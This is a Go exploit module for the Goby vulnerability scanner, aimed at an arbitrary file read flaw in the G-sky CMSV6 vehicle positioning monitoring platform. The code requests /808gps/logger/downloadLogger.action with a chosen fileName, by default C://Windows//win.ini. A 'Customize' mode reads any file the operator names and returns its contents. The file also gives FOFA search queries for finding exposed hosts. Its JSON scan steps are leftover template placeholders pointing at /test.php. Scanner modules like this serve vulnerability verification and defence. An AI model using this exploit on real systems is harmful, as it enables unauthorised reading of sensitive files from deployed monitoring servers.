package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "G-sky CMSV6 monitoring platform /808gps/logger/downloadLogger.action File Read Vulnerability",
    "Description": "<p>G-sky  CMSV6 vehicle positioning monitoring platform has a R &amp; D team with location services, wireless 3G/4G video transmission and cloud storage services as the core, focusing on providing platform services for positioning and wireless video terminal products, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products video integrated platform. </p><p>G-sky CMSV6 vehicle positioning monitoring platform / 808 GPS/logger/downloadLogger action interface has read arbitrary files loopholes, such as information leakage damage, causing the site in the unsafe state.</p>",
    "Product": "G-sky CMSV6",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2024-06-30",
    "PostTime": "2024-07-19",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "GobyQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "Level": "1",
    "Impact": "<p>G-sky CMSV6 vehicle positioning monitoring platform / 808 GPS/logger/downloadLogger action interface has read arbitrary files loopholes, such as information leakage damage, causing the site in the unsafe state.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/XEUEvk84ZfQzjTRCzePGLQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "通天星CMSV6车载视频监控平台 /808gps/logger/downloadLogger.action 文件读取漏洞",
            "Product": "通天星CMSV6车载定位监控平台",
            "Description": "<p>通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。<br></p><p>通天星CMSV6车载定位监控平台/808gps/logger/downloadLogger.action接口处存在任意文件读取漏洞，造成信息泄露等危害，导致网站处于不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>通天星CMSV6车载定位监控平台/808gps/logger/downloadLogger.action接口处存在任意文件读取漏洞，造成信息泄露等危害，导致网站处于不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "G-sky CMSV6 monitoring platform /808gps/logger/downloadLogger.action File Read Vulnerability",
            "Product": "G-sky CMSV6",
            "Description": "<p>G-sky&nbsp; CMSV6 vehicle positioning monitoring platform has a R &amp; D team with location services, wireless 3G/4G video transmission and cloud storage services as the core, focusing on providing platform services for positioning and wireless video terminal products, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products video integrated platform.&nbsp;</p><p>G-sky&nbsp;CMSV6 vehicle positioning monitoring platform / 808 GPS/logger/downloadLogger action interface has read arbitrary files loopholes, such as information leakage damage, causing the site in the unsafe state.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>G-sky&nbsp;CMSV6 vehicle positioning monitoring platform / 808 GPS/logger/downloadLogger action interface has read arbitrary files loopholes, such as information leakage damage, causing the site in the unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	postOrGet_fdsijfiojdsfiog9666g2a96xc0 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path := "/808gps/logger/downloadLogger.action?fileName=" + fileUrl
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C://Windows//win.ini": "[extensions]"}
			// 函数继承
			uploadFileFunc := postOrGet_fdsijfiojdsfiog9666g2a96xc0

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"C://Windows//win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_fdsijfiojdsfiog9666g2a96xc0

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
